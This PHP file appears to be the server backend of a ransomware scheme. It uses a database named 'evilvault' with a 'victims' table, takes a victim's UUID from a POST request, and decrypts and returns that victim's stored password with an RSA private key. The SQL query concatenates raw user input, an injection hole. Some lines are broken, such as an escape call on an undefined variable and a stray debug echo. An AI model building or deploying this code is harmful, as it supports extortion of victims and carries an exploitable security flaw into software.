<!DOCTYPE html>
<html>
<body>

<?php
set_include_path(get_include_path() . PATH_SEPARATOR . 'phpseclib');
include('phpseclib/Crypt/RSA_XML.php');


function getPassword($UUID) {

    $servername = "localhost";
    $username =  "root";
    $password =  "root";
    $dbname =  "evilvault";


    $computername = htmlspecialchars($computername, ENT_QUOTES);
    $username = htmlspecialchars($username, ENT_QUOTES);


    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    } 


    $sql = "SELECT * FROM victims WHERE UUID = '".$UUID."'";
    $result = $conn->query($sql);


    if ($result->num_rows > 0) {

        while($row = $result->fetch_assoc()) {
            $password = $row["Password"];

        }

    } else {
        $password = FALSE;
    }
        $conn->close();
        return $password;
}

function decrypt($data)
    {
        $rsaserver = new Crypt_RSA_XML();
        $myfile = fopen("privatekey.xml", "r") or die("Unable to open file!");
        $privatekey = fread($myfile,filesize("privatekey.xml"));
        $rsaserver->loadKey($privatekey);
        $result = $rsaserver->decrypt(base64_decode($data));
        echo "test";
        return $result;
    }

$key = $_POST['key'];

$password = getPassword($key);

if ($password === FALSE){
    echo "Your UUID is Wrong";
}
else{

    $decrypted_password = decrypt($password);
    echo "Your password is: " . $decrypted_password;
}

?>


</body>
</html>